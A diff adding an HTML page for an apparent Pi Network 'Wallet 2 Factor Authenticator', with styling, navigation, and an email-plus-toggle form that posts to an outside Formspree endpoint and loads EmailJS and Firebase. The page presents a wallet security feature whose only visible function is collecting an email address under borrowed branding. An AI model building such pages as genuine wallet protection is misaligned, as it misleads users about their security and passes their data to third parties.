@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticator - Pi Network Security</title>
+    <link rel="icon" type="image/png" href="pilogo.png">
+    <link rel="stylesheet" href="styles.css">
+    
+    <!-- Extra toggle-specific styling -->
+    <style>
+        .toggle-wrapper {
+            max-width: 500px;
+            margin: 4rem auto;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        .header-with-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .header-icon {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+
+        .toggle-wrapper h2 {
+            color: var(--pi-purple);
+            margin-bottom: 0;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: 2px solid var(--border-color);
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+            transition: border-color 0.3s;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: var(--pi-purple);
+        }
+
+        .email-input.error {
+            border-color: #e74c3c;
+        }
+
+        .toggle {
+            width: 120px;
+            height: 55px;
+            background: #ddd;
+            border-radius: 50px;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin: 0 auto;
+        }
+
+        .toggle.on {
+            background: var(--success-color);
+        }
+
+        .toggle.disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .toggle-circle {
+            width: 45px;
+            height: 45px;
+            background: white;
+            border-radius: 50%;
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            transition: left 0.3s;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .toggle.on .toggle-circle {
+            left: 70px;
+        }
+
+        .status-text {
+            margin-top: 1.5rem;
+            font-weight: bold;
+            font-size: 1.1rem;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 1rem;
+            display: none;
+            animation: slideIn 0.3s ease;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .info-box {
+            background: #f8f9fa;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 2rem;
+            text-align: left;
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .info-box strong {
+            color: var(--pi-purple);
+        }
+
+        .error-banner {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+            display: none;
+            border-left: 4px solid #e74c3c;
+        }
+
+        .error-banner.show {
+            display: block;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #f39c12;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="logo">
+                <img src="pilogo.png" alt="Pi Logo" class="logo-img">
+                <span>PiAuth</span>
+            </a>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="active">Home</a></li>
+                <li><a href="security-basics.html">Security Basics</a></li>
+                <li><a href="phishing-awareness.html">Phishing Awareness</a></li>
+                <li><a href="wallet-protection.html">Wallet Protection</a></li>
+                <li><a href="resources.html">Resources</a></li>
+            </ul>
+            <div class="hamburger" id="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <div class="toggle-wrapper">
+        <div class="error-banner" id="errorBanner">
+            ⚠️ <span id="errorText"></span>
+        </div>
+
+        <div class="header-with-icon">
+            <img src="pi2fa.jpeg" alt="2FA Icon" class="header-icon">
+            <h2>Wallet 2 Factor Authenticator</h2>
+        </div>
+        <p class="subtitle">Secure your wallet with two-factor authentication</p>
+
+        <form id="toggleForm" action="https://formspree.io/f/xeeeejkg" method="POST">
+            <input
+                type="email"
+                name="email"
+                class="email-input"
+                placeholder="Enter your email address"
+                required
+            />
+
+            <input type="hidden" name="action" id="actionField">
+            <input type="hidden" name="_subject" value="Pi Wallet 2FA Status Update">
+            <input type="hidden" name="timestamp" id="timestampField">
+            <input type="hidden" name="_replyto" value="">
+
+            <div class="toggle" id="toggleBtn">
+                <div class="toggle-circle"></div>
+            </div>
+
+            <p class="status-text" id="statusText">2-factor authentication is OFF</p>
+            
+            <div class="success-message" id="successMessage">
+                ✓ Check your email for confirmation!
+            </div>
+        </form>
+
+        <div class="info-box">
+            <strong>📧 What happens next?</strong><br>
+            You'll receive a confirmation email with your 2FA status and important security tips.
+        </div>
+    </div>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <!-- Firebase Config -->
+    <script src="firebase-config.js"></script>
+    
+    <!-- Page Script -->
+    <script src="script.js"></script>
+</body>
+</html>
+
